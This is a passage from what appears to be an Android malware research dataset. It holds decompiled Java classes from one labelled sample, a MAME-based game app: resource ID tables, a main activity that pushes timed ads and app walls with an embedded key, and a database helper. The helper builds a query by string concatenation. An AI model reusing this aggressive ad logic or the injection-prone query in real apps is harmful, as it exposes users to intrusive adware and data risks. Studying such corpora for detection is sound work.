int vkeys=0x7f0b0048; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\layout.code","public static final class layout {   public static final int ad=0x7f030000;   public static final int app_download_notification=0x7f030001;   public static final int bar=0x7f030002;   public static final int download_notification=0x7f030003;   public static final int emuview_gl=0x7f030004;   public static final int emuview_hw=0x7f030005;   public static final int emuview_sw=0x7f030006;   public static final int filterview=0x7f030007;   public static final int help=0x7f030008;   public static final int item=0x7f030009;   public static final int levelactivity=0x7f03000a;   public static final int levelitem=0x7f03000b;   public static final int localadview=0x7f03000c;   public static final int main=0x7f03000d;   public static final int main1=0x7f03000e;   public static final int mainactivyty=0x7f03000f;   public static final int mmain=0x7f030010;   public static final int notification=0x7f030011;   public static final int show=0x7f030012;   public static final int showapplayout2=0x7f030013;   public static final int shuoming=0x7f030014;   public static final int submit=0x7f030015;   public static final int update=0x7f030016; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\menu.code","public static final class menu {   public static final int menu=0x7f0a0000; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\R.code","public final class R { public static final class array {     public static final int pref_controller_type_options=0x7f060008;     public static final int pref_controller_type_values=0x7f060009;     public static final int pref_dz_options=0x7f06000c;     public static final int pref_dz_values=0x7f06000d;     public static final int pref_filter_options=0x7f060000;     public static final int pref_filter_values=0x7f060001;     public static final int pref_global_video_render_options=0x7f060006;     public static final int pref_global_video_render_values=0x7f060007;     public static final int pref_input_external_options=0x7f06000a;     public static final int pref_input_external_values=0x7f06000b;     public static final int pref_landscape_controllerType_options=0x7f060004;     public static final int pref_landscape_controllerType_values=0x7f060005;     public static final int pref_scaleMode_options=0x7f060002;     public static final int pref_scaleMode_values=0x7f060003;   } public static final class attr {     public static final int backgroundColor=0x7f010000;     public static final int keywords=0x7f010003;     public static final int primaryTextColor=0x7f010001;     public static final int refreshInterval=0x7f010004;     public static final int secondaryTextColor=0x7f010002;   } public static final class color {     public static final int black=0x7f070002;     public static final int emu_back_color=0x7f070000;     public static final int grey=0x7f070003;     public static final int red=0x7f070004;     public static final int white=0x7f070001;   } public static final class drawable {     public static final int audio=0x7f020000;     public static final int b_biggame=0x7f020001;     public static final int b_lock=0x7f020002;     public static final int back_portrait=0x7f020003;     public static final int background=0x7f020004;     public static final int black=0x7f020046;     public static final int border=0x7f020005;     public static final int btn=0x7f020006;     public static final int bts=0x7f020007;     public static final int button_a=0x7f020008;     public static final int button_a_press=0x7f020009;     public static final int button_b=0x7f02000a;     public static final int button_b_press=0x7f02000b;     public static final int button_l1=0x7f02000c;     public static final int button_l1_press=0x7f02000d;     public static final int button_l2=0x7f02000e;     public static final int button_l2_press=0x7f02000f;     public static final int button_r1=0x7f020010;     public static final int button_r1_press=0x7f020011;     public static final int button_r2=0x7f020012;     public static final int button_r2_press=0x7f020013;     public static final int button_select=0x7f020014;     public static final int button_select_press=0x7f020015;     public static final int button_start=0x7f020016;     public static final int button_start_press=0x7f020017;     public static final int button_x=0x7f020018;     public static final int button_x_press=0x7f020019;     public static final int button_y=0x7f02001a;     public static final int button_y_press=0x7f02001b;     public static final int close=0x7f02001c;     public static final int closen=0x7f02001d;     public static final int closep=0x7f02001e;     public static final int crt_1=0x7f02001f;     public static final int crt_2=0x7f020020;     public static final int directory_icon=0x7f020021;     public static final int directory_up=0x7f020022;     public static final int fcz=0x7f020023;     public static final int file_icon=0x7f020024;     public static final int hjdt=0x7f020025;     public static final int hook=0x7f020026;     public static final int icon=0x7f020027;     public static final int klkd=0x7f020028;     public static final int levelbutton=0x7f020029;     public static final int longwang=0x7f02002a;     public static final int menubutton=0x7f02002b;     public static final int mjbj=0x7f02002c;     public static final int mjcs=0x7f02002d;     public static final int myapp=0x7f02002e;     public static final int n_biggame=0x7f02002f;     public static final int off=0x7f020030;     public static final int on=0x7f020031;     public static final int onoff_bg=0x7f020032;     public static final int qiji=0x7f020033;     public static final int qsbj=0x7f020034;     public static final int sanguo=0x7f020035;     public static final int scanline_1=0x7f020036;     public static final int scanline_2=0x7f020037;     public static final int speaker=0x7f020038;     public static final int speaker_disable=0x7f020039;     public static final int speakerp=0x7f02003a;     public static final int stick_down=0x7f02003b;     public static final int stick_down_left=0x7f02003c;     public static final int stick_down_right=0x7f02003d;     public static final int stick_inner=0x7f02003e;     public static final int stick_left=0x7f02003f;     public static final int stick_none=0x7f020040;     public static final int stick_outer=0x7f020041;     public static final int stick_right=0x7f020042;     public static final int stick_up=0x7f020043;     public static final int stick_up_left=0x7f020044;     public static final int stick_up_right=0x7f020045;     public static final int translucent=0x7f020047;     public static final int transparent=0x7f020048;   } public static final class id {     public static final int ButtonContinue=0x7f0b0016;     public static final int CheckBox01=0x7f0b0047;     public static final int EmulatorFrame=0x7f0b0024;     public static final int EmulatorViewGL=0x7f0b000f;     public static final int EmulatorViewHW=0x7f0b0010;     public static final int EmulatorViewSW=0x7f0b0011;     public static final int FilterView=0x7f0b0012;     public static final int InputView=0x7f0b0025;     public static final int LinearLayout01=0x7f0b0013;     public static final int ProgressBar01=0x7f0b0046;     public static final int ScrollView01=0x7f0b0014;     public static final int TextView01=0x7f0b0015;     public static final int ad=0x7f0b0000;     public static final int adView=0x7f0b0030;     public static final int ad_container=0x7f0b003c;     public static final int adview=0x7f0b0022;     public static final int app=0x7f0b0008;     public static final int appIcon=0x7f0b0009;     public static final int audio=0x7f0b002e;     public static final int audio2=0x7f0b002f;     public static final int button1=0x7f0b001c;     public static final int checkBox1=0x7f0b0032;     public static final int checkBox2=0x7f0b0033;     public static final int consume=0x7f0b0041;     public static final int description=0x7f0b000d;     public static final int dest=0x7f0b0018;     public static final int download_icon=0x7f0b0001;     public static final int download_name=0x7f0b0002;     public static final int edittext_score=0x7f0b0045;     public static final int free=0x7f0b002a;     public static final int freecity=0x7f0b0040;     public static final int freecontrol=0x7f0b0042;     public static final int get_balance=0x7f0b003e;     public static final int imageView1=0x7f0b001a;     public static final int itemroot=0x7f0b001d;     public static final int level1=0x7f0b001f;     public static final int level2=0x7f0b0021;     public static final int linearLayout1=0x7f0b0017;     public static final int linearLayout2=0x7f0b0023;     public static final int linearLayout3=0x7f0b002c;     public static final int linearLayout4=0x7f0b0031;     public static final int listView1=0x7f0b0034;     public static final int make_money=0x7f0b003f;     public static final int menu_options_option=0x7f0b004f;     public static final int menu_quit_game_option=0x7f0b0050;     public static final int menu_quit_option=0x7f0b0051;     public static final int mid=0x7f0b0039;     public static final int mname=0x7f0b003a;     public static final int mscore=0x7f0b003b;     public static final int notification=0x7f0b000b;     public static final int notification2=0x7f0b0037;     public static final int notification_icon=0x7f0b0035;     public static final int notification_name=0x7f0b0038;     public static final int notification_title=0x7f0b0036;     public static final int progress=0x7f0b0027;     public static final int progressBar1=0x7f0b001b;     public static final int progress_bar=0x7f0b000e;     public static final int progress_text=0x7f0b000a;     public static final int quit=0x7f0b002b;     public static final int relativeLayout1=0x7f0b001e;     public static final int root=0x7f0b0026;     public static final int scrollView1=0x7f0b0044;     public static final int seekbar=0x7f0b0007;     public static final int selectmap=0x7f0b0029;     public static final int show_msg=0x7f0b003d;     public static final int size=0x7f0b0019;     public static final int startgame=0x7f0b0028;     public static final int textView1=0x7f0b0020;     public static final int textView2=0x7f0b002d;     public static final int title=0x7f0b000c;     public static final int update=0x7f0b0043;     public static final int update_notification_progressbar=0x7f0b0005;     public static final int update_notification_progressblock=0x7f0b0004;     public static final int update_notification_progresstext=0x7f0b0003;     public static final int value=0x7f0b0006;     public static final int vkey_A=0x7f0b004b;     public static final int vkey_B=0x7f0b004c;     public static final int vkey_MENU=0x7f0b004d;     public static final int vkey_SELECT=0x7f0b004e;     public static final int vkey_X=0x7f0b0049;     public static final int vkey_Y=0x7f0b004a;     public static final int vkeys=0x7f0b0048;   } public static final class layout {     public static final int ad=0x7f030000;     public static final int app_download_notification=0x7f030001;     public static final int bar=0x7f030002;     public static final int download_notification=0x7f030003;     public static final int emuview_gl=0x7f030004;     public static final int emuview_hw=0x7f030005;     public static final int emuview_sw=0x7f030006;     public static final int filterview=0x7f030007;     public static final int help=0x7f030008;     public static final int item=0x7f030009;     public static final int levelactivity=0x7f03000a;     public static final int levelitem=0x7f03000b;     public static final int localadview=0x7f03000c;     public static final int main=0x7f03000d;     public static final int main1=0x7f03000e;     public static final int mainactivyty=0x7f03000f;     public static final int mmain=0x7f030010;     public static final int notification=0x7f030011;     public static final int show=0x7f030012;     public static final int showapplayout2=0x7f030013;     public static final int shuoming=0x7f030014;     public static final int submit=0x7f030015;     public static final int update=0x7f030016;   } public static final class menu {     public static final int menu=0x7f0a0000;   } public static final class raw {     public static final int controller_landscape=0x7f050000;     public static final int controller_portrait=0x7f050001;     public static final int readme=0x7f050002;   } public static final class string {     public static final int app_name=0x7f08001e;     public static final int cancelask=0x7f080011;     public static final int howtoplay=0x7f08001f;     public static final int isloaddouble=0x7f080002;     public static final int isminfirst=0x7f080001;     public static final int issave=0x7f080005;     public static final int loading=0x7f080003;     public static final int menu_help=0x7f08001d;     public static final int menu_options=0x7f08001a;     public static final int menu_quit=0x7f08001c;     public static final int menu_quit_game=0x7f08001b;     public static final int menu_vkey_A=0x7f080015;     public static final int menu_vkey_B=0x7f080016;     public static final int menu_vkey_MENU=0x7f080017;     public static final int menu_vkey_SELECT=0x7f080018;     public static final int menu_vkey_X=0x7f080013;     public static final int menu_vkey_Y=0x7f080014;     public static final int menu_vkeys=0x7f080019;     public static final int queding=0x7f08000d;     public static final int quitask=0x7f08000b;     public static final int replayask=0x7f08000f;     public static final int roadgame=0x7f080006;     public static final int setaudio=0x7f080004;     public static final int setdir=0x7f08000a;     public static final int setting=0x7f080010;     public static final int skills=0x7f080020;     public static final int tishi=0x7f080012;     public static final int xiaoxi=0x7f08000e;     public static final int xyrate=0x7f080000;     public static final int zerror=0x7f08000c;     public static final int zmore=0x7f080008;     public static final int zno=0x7f080009;     public static final int zyes=0x7f080007;   } public static final class style {     public static final int CustomCheckboxTheme=0x7f090004;     public static final int ListText=0x7f090000;     public static final int ListTextSmall=0x7f090001;     public static final int Theme_MAME4ALL=0x7f090002;     public static final int Theme_MAME4ALL_TitleBar=0x7f090003;   } public static final class styleable {     public static final int[] com_admob_android_ads_AdView={R.attr.backgroundColor,R.attr.primaryTextColor,R.attr.secondaryTextColor,R.attr.keywords,R.attr.refreshInterval};     public static final int com_admob_android_ads_AdView_backgroundColor=0x00000000;     public static final int com_admob_android_ads_AdView_keywords=0x00000003;     public static final int com_admob_android_ads_AdView_primaryTextColor=0x00000001;     public static final int com_admob_android_ads_AdView_refreshInterval=0x00000004;     public static final int com_admob_android_ads_AdView_secondaryTextColor=0x00000002;   } public static final class xml {     public static final int userpreferences=0x7f040000;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\raw.code","public static final class raw {   public static final int controller_landscape=0x7f050000;   public static final int controller_portrait=0x7f050001;   public static final int readme=0x7f050002; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\string.code","public static final class string {   public static final int app_name=0x7f08001e;   public static final int cancelask=0x7f080011;   public static final int howtoplay=0x7f08001f;   public static final int isloaddouble=0x7f080002;   public static final int isminfirst=0x7f080001;   public static final int issave=0x7f080005;   public static final int loading=0x7f080003;   public static final int menu_help=0x7f08001d;   public static final int menu_options=0x7f08001a;   public static final int menu_quit=0x7f08001c;   public static final int menu_quit_game=0x7f08001b;   public static final int menu_vkey_A=0x7f080015;   public static final int menu_vkey_B=0x7f080016;   public static final int menu_vkey_MENU=0x7f080017;   public static final int menu_vkey_SELECT=0x7f080018;   public static final int menu_vkey_X=0x7f080013;   public static final int menu_vkey_Y=0x7f080014;   public static final int menu_vkeys=0x7f080019;   public static final int queding=0x7f08000d;   public static final int quitask=0x7f08000b;   public static final int replayask=0x7f08000f;   public static final int roadgame=0x7f080006;   public static final int setaudio=0x7f080004;   public static final int setdir=0x7f08000a;   public static final int setting=0x7f080010;   public static final int skills=0x7f080020;   public static final int tishi=0x7f080012;   public static final int xiaoxi=0x7f08000e;   public static final int xyrate=0x7f080000;   public static final int zerror=0x7f08000c;   public static final int zmore=0x7f080008;   public static final int zno=0x7f080009;   public static final int zyes=0x7f080007; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\style.code","public static final class style {   public static final int CustomCheckboxTheme=0x7f090004;   public static final int ListText=0x7f090000;   public static final int ListTextSmall=0x7f090001;   public static final int Theme_MAME4ALL=0x7f090002;   public static final int Theme_MAME4ALL_TitleBar=0x7f090003; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\styleable.code","public static final class styleable {   public static final int[] com_admob_android_ads_AdView={R.attr.backgroundColor,R.attr.primaryTextColor,R.attr.secondaryTextColor,R.attr.keywords,R.attr.refreshInterval};   public static final int com_admob_android_ads_AdView_backgroundColor=0x00000000;   public static final int com_admob_android_ads_AdView_keywords=0x00000003;   public static final int com_admob_android_ads_AdView_primaryTextColor=0x00000001;   public static final int com_admob_android_ads_AdView_refreshInterval=0x00000004;   public static final int com_admob_android_ads_AdView_secondaryTextColor=0x00000002; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.game.breakrev\xml.code","public static final class xml {   public static final int userpreferences=0x7f040000; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.mygame\LoadChapterThread.code","public class LoadChapterThread extends Thread {   Runnable mRunnable;   public LoadChapterThread(  Runnable run){     this.mRunnable=null;     this.mRunnable=run;   }   @Override public void run(){     if (this.mRunnable != null) {       this.mRunnable.run();     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.mygame\mainActivity.code","public class mainActivity extends Activity {   public static final boolean bIsStick=false;   SharedPreferences mSettings;   public static int countX=10;   public static int countY=12;   public static boolean sIswhowallkey=true;   public static String sRomsDir=""/poms/maoxiandao"";   public static String sRomsDir1=""/poms/maoxiandao"";   public static String sRomsRootDir=""/poms/"";   public static boolean bIsGoodPic=false;   public static boolean bIsAutocoin=false;   public static int sdelaytime=300;   String sPakName=""maoxiandao"";   View mAdView=null;   Handler mHandler2=new Handler(){     @Override public void handleMessage(    Message msg){       super.handleMessage(msg);       int i=msg.what;     }   } ;   View mselectView=null;   int GETFREE=1;   boolean bIsfirstin=true;   long nlasttime=0;   public final String[] items={""(é�žå¸¸ç®€å�•) 3X3"",""ç®€å�• (4X4)"",""ä¸€èˆ¬ï¼ˆ5x5ï¼‰"",""éš¾ï¼ˆ6X6ï¼‰"",""å¾ˆéš¾ï¼ˆ7X7ï¼‰"",""é�žå¸¸éš¾(8X8)""};   AlertDialog mAlertDialog=null;   String mShowString=null;   ProgressDialog mProgressDialog=null;   Handler mHandler=new Handler(){     @Override public void handleMessage(    Message msg){       super.handleMessage(msg);       if (msg.what == 1 && mainActivity.this.mProgressDialog != null) {         mainActivity.this.mProgressDialog.dismiss();       }     }   } ;   AlertDialog mAudioDialog=null;   SeekBar mVolumeBar=null;   final int MSG_TOGLECONTROL=5;   int TOGLECONTROL_TIME=10000;   SeekBar.OnSeekBarChangeListener mOnVolumeChangeListener=new SeekBar.OnSeekBarChangeListener(){     @Override public void onProgressChanged(    SeekBar seekBar,    int progress,    boolean fromUser){     }     @Override public void onStartTrackingTouch(    SeekBar seekBar){       mainActivity.this.mHandler.removeMessages(5);       mainActivity.this.mHandler.sendEmptyMessageDelayed(5,mainActivity.this.TOGLECONTROL_TIME);     }     @Override public void onStopTrackingTouch(    SeekBar seekBar){       mainActivity.this.mHandler.removeMessages(5);       mainActivity.this.mHandler.sendEmptyMessageDelayed(5,mainActivity.this.TOGLECONTROL_TIME);       if (mainActivity.this.mAudioManager == null) {         mainActivity.this.mAudioManager=(AudioManager)mainActivity.this.getSystemService(""audio"");       }       int mMaxVolume=mainActivity.this.mAudioManager.getStreamMaxVolume(3);       mainActivity.this.mAudioManager.getStreamVolume(3);       int nVolume=(mainActivity.this.mVolumeBar.getProgress() * mMaxVolume) / 100;       mainActivity.this.mAudioManager.setStreamVolume(3,nVolume,4);     }   } ;   AudioManager mAudioManager=null;   int bisshowmore=-1;   @Override protected void onCreate(  Bundle savedInstanceState){     String str2;     super.onCreate(savedInstanceState);     progressbase.instance();     myazcover.strID=""15lB0wc2M8a3vuz5Q8o1o5F3"";     AppWallManager.init(getApplicationContext(),""15lB0wc2M8a3vuz5Q8o1o5F3"");     localAdView.sappKey=myazcover.strID;     myazcover.instance().init(this,myazcover.strID);     localAdView.sbisshowcloseUp=true;     try {       ApplicationInfo ai=getPackageManager().getApplicationInfo(getPackageName(),128);       Bundle bundle=ai.metaData;       if (bundle != null) {         bundle.getString(""UMENG_CHANNEL"");       }       PackageInfo pInfo=getPackageManager().getPackageInfo(getPackageName(),0);       String strName=String.valueOf(""com."") + ""android"";       String str=String.valueOf(String.valueOf(String.valueOf(strName) + ""free."") + ""fkji"") + ""mub"";       this.sPakName=pInfo.packageName;     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();     }     String str1=this.sPakName;     if (str1 != null && str1.length() > 0 && str1.lastIndexOf(""."") > 0 && (str2=str1.substring(str1.lastIndexOf(""."") + 1)) != null && str2.length() > 0) {       sRomsDir=sRomsDir.replace(""maoxiandao"",str2);       sRomsDir1=sRomsDir1.replace(""maoxiandao"",str2);     }     getWindow().setFlags(IController.L1_VALUE,IController.L1_VALUE);     requestWindowFeature(1);     WindowManager windowManager=getWindowManager();     Display display=windowManager.getDefaultDisplay();     int width=display.getWidth();     int height=display.getHeight();     if (height <= 320 || width <= 240) {       countX=8;       countY=8;     }  else     if (height <= 480 || width <= 320) {       countX=10;       countY=11;     }  else     if (height >= 800 && width >= 480) {       countX=10;       countY=13;     }     setContentView(R.layout.mainactivyty);     findViewById(R.id.startgame).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         String strdouble=mainActivity.this.getResources().getString(R.string.isloaddouble);         if (strdouble != null && strdouble.contains(""yes"")) {           mainActivity.sRomsDir=String.valueOf(mainActivity.sRomsDir1) + ""2"" + File.separator;         }  else {           mainActivity.sRomsDir=String.valueOf(mainActivity.sRomsDir1) + File.separator;         }         if (MainHelper.isRomsReady(String.valueOf(config.getSdcardDir()) + mainActivity.sRomsDir,"""",mainActivity.this)) {           Intent in=new Intent();           in.setClass(mainActivity.this,MAME4all.class);           mainActivity.this.startActivity(in);           return;         }         mainActivity.this.LoadData();       }     } );     this.mselectView=findViewById(R.id.selectmap);     initSelectView();     findViewById(R.id.quit).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         mainActivity.this.quit();       }     } );     findViewById(R.id.free).setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         AppWallManager.showAppWall(mainActivity.this);       }     } );     findViewById(R.id.free).setVisibility(8);     CheckBox checkBox=(CheckBox)findViewById(R.id.checkBox1);     bIsAutocoin=utility.Instance().getBoolPreferencesValue(this,""autocoin"",false);     checkBox.setChecked(bIsAutocoin);     checkBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener(){       @Override public void onCheckedChanged(      CompoundButton buttonView,      boolean isChecked){         mainActivity.bIsAutocoin=isChecked;         utility.Instance().SaveBoolPreference(mainActivity.this,""autocoin"",Boolean.valueOf(mainActivity.bIsAutocoin));       }     } );     intiBox2();     localAdView.sbisshowclose=true;     this.mHandler.postDelayed(new Runnable(){       @Override public void run(){         mainActivity.AddAdview(mainActivity.this,null);         myazcover.instance().showazad(mainActivity.this);       }     } ,3000L);   }   public static void AddAdview(  Activity ctx,  View adview){     if (ctx != null && adview == null) {       View adview2=new localAdView(ctx,null);       FrameLayout.LayoutParams localLayoutParams=new FrameLayout.LayoutParams(-1,-2);       localLayoutParams.bottomMargin=0;       localLayoutParams.leftMargin=190;       ctx.addContentView(adview2,localLayoutParams);     }   }   void initSelectView(){     if (this.mselectView != null) {       this.mselectView.setOnClickListener(new View.OnClickListener(){         @Override public void onClick(        View v){           AppWallManager.showAppWall(mainActivity.this);         }       } );       TextView text=(TextView)this.mselectView.findViewById(R.id.textView1);       if (text != null) {         text.setText(""ç²¾å“�æŽ¨è��"");       }     }   }   void intiBox2(){     CheckBox checkBox2=(CheckBox)findViewById(R.id.checkBox2);     bIsGoodPic=utility.Instance().getBoolPreferencesValue(this,PrefsHelper.PREF_LANDSCAPE_BITMAP_FILTERING,false);     checkBox2.setChecked(bIsGoodPic);     checkBox2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener(){       @Override public void onCheckedChanged(      CompoundButton buttonView,      boolean isChecked){         mainActivity.bIsGoodPic=isChecked;         utility.Instance().SaveBoolPreference(mainActivity.this,PrefsHelper.PREF_LANDSCAPE_BITMAP_FILTERING,Boolean.valueOf(mainActivity.bIsGoodPic));       }     } );   }   @Override public boolean onCreateOptionsMenu(  Menu menu){     super.onCreateOptionsMenu(menu);     return true;   }   @Override public boolean onOptionsItemSelected(  MenuItem item){     return super.onOptionsItemSelected(item);   }   @Override public boolean onKeyDown(  int keyCode,  KeyEvent event){     if (keyCode != 4) {       return super.onKeyDown(keyCode,event);     }     quit();     return true;   }   void quit(){     AlertDialog.Builder builder=new AlertDialog.Builder(this).setTitle(utility.getString(this,R.string.tishi)).setMessage(utility.getString(this,R.string.quitask)).setPositiveButton(utility.getString(this,R.string.zno),new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog,      int which){       }     } ).setNegativeButton(utility.getString(this,R.string.zyes),new DialogInterface.OnClickListener(){       @Override public void onClick(      DialogInterface dialog,      int whichButton){         mainActivity.this.finish();       }     } );     IsShowMore();     builder.show();   }   @Override protected void onDestroy(){     if (this.mHandler2 != null) {       this.mHandler2.removeMessages(120);     }     super.onDestroy();   }   @Override protected void onResume(){     super.onResume();     initSelectView();     if (!this.bIsfirstin) {       long curtime=System.currentTimeMillis();       if (Math.abs(curtime - this.nlasttime) > 15000) {         this.nlasttime=curtime;         myazcover.instance().showazad(this);       }     }     this.bIsfirstin=false;   }   @Override protected void onPause(){     super.onPause();   }   void showSetingDlg(){     if (this.mAlertDialog == null) {       int nIndex=utility.Instance().getIntPreferencesValue(this,""hlevel"",1);       AlertDialog.Builder builder=new AlertDialog.Builder(this);       builder.setTitle(""é€‰æ‹©éš¾åº¦"");       builder.setSingleChoiceItems(this.items,nIndex,new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int item){           utility.Instance().SaveIntPreference(mainActivity.this,""hlevel"",item);           mainActivity.this.mAlertDialog.hide();         }       } );       this.mAlertDialog=builder.create();     }     this.mAlertDialog.show();   }   void closeDlg(){     if (this.mProgressDialog != null) {       this.mProgressDialog.dismiss();     }   }   void ShowProgressDlg(  String title,  String message,  int DelayMsg,  int DelayTime){     this.mShowString=message;     if (this.mProgressDialog != null) {       this.mProgressDialog.dismiss();     }     this.mProgressDialog=ProgressDialog.show(this,title,message,true,true,new DialogInterface.OnCancelListener(){       @Override public void onCancel(      DialogInterface dialog){       }     } );     this.mHandler.sendEmptyMessageDelayed(DelayMsg,DelayTime);   }   void showAudioDlg(){     if (this.mAlertDialog == null) {       this.mVolumeBar=new SeekBar(this);       utility.Instance().getIntPreferencesValue(this,""hlevel"",1);       AlertDialog.Builder builder=new AlertDialog.Builder(this);       builder.setTitle(utility.getString(this,R.string.setaudio));       builder.setNegativeButton(utility.getString(this,R.string.queding),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialog,        int which){           mainActivity.this.mAlertDialog.hide();         }       } ).setView(this.mVolumeBar);       this.mVolumeBar.setOnSeekBarChangeListener(this.mOnVolumeChangeListener);       this.mAlertDialog=builder.create();     }     if (this.mVolumeBar != null) {       if (this.mAudioManager == null) {         this.mAudioManager=(AudioManager)getSystemService(""audio"");       }       int mMaxVolume=this.mAudioManager.getStreamMaxVolume(3);       int mCurVolume=this.mAudioManager.getStreamVolume(3);       int progress=(mCurVolume * 100) / mMaxVolume;       this.mVolumeBar.setProgress(progress);       this.mVolumeBar.setMax(100);     }     if (this.mAlertDialog != null) {       this.mAlertDialog.show();     }   } public class LoadChapterThread extends Thread {     Runnable mRunnable;     public LoadChapterThread(    Runnable run){       this.mRunnable=null;       this.mRunnable=run;     }     @Override public void run(){       if (this.mRunnable != null) {         this.mRunnable.run();       }     }   }   void _LoadData(){     String strdouble=getResources().getString(R.string.isloaddouble);     if (strdouble != null && strdouble.contains(""yes"")) {       config.MkDir(String.valueOf(config.getSdcardDir()) + sRomsRootDir);       config.MkDir(String.valueOf(config.getSdcardDir()) + sRomsDir);       MainHelper.copyFiles(String.valueOf(config.getSdcardDir()) + sRomsDir,this,false,""data2"");     }  else {       config.MkDir(String.valueOf(config.getSdcardDir()) + sRomsRootDir);       config.MkDir(String.valueOf(config.getSdcardDir()) + sRomsDir);       MainHelper.copyFiles(String.valueOf(config.getSdcardDir()) + sRomsDir,this,false,""data"");     }     Intent in=new Intent();     in.setClass(this,MAME4all.class);     startActivity(in);   }   public boolean isdelayok(  Context ctx){     String config=utility.Instance().getPreferencesValue(ctx,""myconfig"",""0000000000"");     if (config != null && config.length() > 7) {       String str=new StringBuilder().append(config.charAt(7)).toString();       if (str.equals(""2"")) {         return true;       }     }     int nCurTime=(int)(System.currentTimeMillis() / 1000);     int nLast=utility.Instance().getIntPreferencesValue(ctx,""startup"",0);     if (nLast != 0) {       return Math.abs(nLast - nCurTime) > sdelaytime;     }     utility.Instance().SaveIntPreference(ctx,""startup"",nCurTime);     return false;   }   boolean IsShowMore(){     if (this.bisshowmore != -1) {       return this.bisshowmore == 1;     }     this.bisshowmore=0;     int nLastTime=utility.Instance().getIntPreferencesValue(this,""firststart"",0);     int nCurTime=(int)(System.currentTimeMillis() / 1000);     if (nLastTime == 0) {       nLastTime=nCurTime;       utility.Instance().SaveIntPreference(this,""firststart"",nCurTime);     }     if (Math.abs(nCurTime - nLastTime) < 600) {       return false;     }     this.bisshowmore=1;     return true;   }   void LoadData(){     LoadChapterThread loadChapterThread=new LoadChapterThread(new Runnable(){       @Override public void run(){         progressbase.instance().ShowProgressDlg(mainActivity.this,""æ��ç¤º"",""ç¬¬ä¸€æ¬¡å�¯åŠ¨æ¸¸æˆ�ï¼Œæ­£åœ¨åˆ�å§‹åŒ–æ•°æ�®..."");         mainActivity.this._LoadData();         progressbase.instance().cancelProgress(0);       }     } );     loadChapterThread.start();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.mygame\ShuoMing.code","public class ShuoMing extends Activity {   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     setContentView(R.layout.shuoming);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.mygame\SQLiteHelper.code","public class SQLiteHelper extends SQLiteOpenHelper {   private static final String DATABASE_NAME=""jewels.db"";   private static final int DATABASE_VERSION=1;   private static final String TABLE_NAME=""score"";   private static final String TAG=""SQLiteHelper"";   private SQLiteDatabase mDB;   public SQLiteHelper(  Context context){     super(context,DATABASE_NAME,(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase db){     db.execSQL(""create table if not exists score (_id integer primary key autoincrement,_name varchar(50),_score integer,_model integer,_rank integer)"");     Log.i(TAG,""onCreate"");   }   @Override public void onUpgrade(  SQLiteDatabase db,  int oldVersion,  int newVersion){     Log.w(TAG,""Upgrading database from version "" + oldVersion + "" to ""+ newVersion+ "", which will destroy all old data"");     db.execSQL(""drop table if exists score"");     onCreate(db);     Log.i(TAG,""onUpgrade"");   }   public void insertData(  String name,  int score,  int model,  int rank){     this.mDB=getWritableDatabase();     this.mDB.beginTransaction();     ContentValues values=new ContentValues();     values.put(""_name"",name);     values.put(""_score"",Integer.valueOf(score));     values.put(""_model"",Integer.valueOf(model));     values.put(""_rank"",Integer.valueOf(rank));     try {       this.mDB.insert(TABLE_NAME,""_id"",values);       this.mDB.setTransactionSuccessful();     }  catch (    Exception e) {       Log.e(TAG,e.getMessage());     }  finally {       this.mDB.endTransaction();       this.mDB.close();     }   }   public boolean isNameExist(  String nameString){     boolean flag=false;     this.mDB=getReadableDatabase();     Cursor cursor=this.mDB.query(TABLE_NAME,null,""_name='"" + nameString + ""'"",null,null,null,""_score desc"",""3"");     int nameIndex=cursor.getColumnIndex(""_name"");     cursor.moveToFirst();     while (!cursor.isAfterLast()) {       if (cursor.getString(nameIndex).equals("""") || cursor.getString(nameIndex) == null) {         flag=false;       }  else {         flag=true;       }       cursor.moveToNext();     }     cursor.close();     this.mDB.close();     return flag;   }   public String queryData(){     int i=0;     String result="""";     this.mDB=getReadableDatabase();     Cursor cursor=this.mDB.query(TABLE_NAME,null,null,null,null,null,""_score desc"",""3"");     int nameIndex=cursor.getColumnIndex(""_name"");     int scoreIndex=cursor.getColumnIndex(""_score"");     cursor.moveToFirst();     while (!cursor.isAfterLast()) {       i++;       result=String.valueOf(String.valueOf(String.valueOf(result) + i + ""          "") + cursor.getString(nameIndex) + ""         "") + 